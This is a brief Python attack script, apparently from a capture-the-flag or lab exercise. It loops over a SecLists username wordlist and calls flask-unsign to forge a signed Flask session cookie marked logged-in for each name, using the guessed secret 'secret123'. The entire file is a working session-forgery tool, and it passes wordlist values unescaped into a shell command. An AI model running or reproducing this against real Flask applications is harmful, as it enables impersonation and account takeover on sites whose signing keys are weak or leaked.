#!env python3

import os

with open("/usr/share/seclists/Usernames/Names/names.txt", "r") as file:
	usernames = file.readlines()
	for user in usernames:
		cmd = f"flask-unsign --sign --cookie \"{{'logged_in': True, 'username': '{user.strip()}'}}\" --secret secret123"
		cookie = os.system(cmd)
